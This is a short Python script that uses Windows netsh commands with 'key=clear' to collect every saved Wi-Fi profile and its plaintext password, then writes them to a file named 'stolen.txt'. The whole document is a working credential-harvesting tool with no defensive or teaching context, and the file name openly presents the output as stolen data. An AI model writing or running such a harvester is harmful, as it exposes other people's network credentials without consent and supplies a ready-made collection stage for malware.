import subprocess
import re
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))

wifi_data = ""

for profile in profile_names:

    profile = profile.strip()

    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
                                  capture_output=True).stdout.decode()

    profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)

    if len(profile_password) == 0:
        wifi_data += f"{profile}: Open\n"
    else:
        wifi_data += f"{profile}: {profile_password[0].strip()}\n"

with open("stolen.txt", "w") as file:
    file.write(wifi_data)
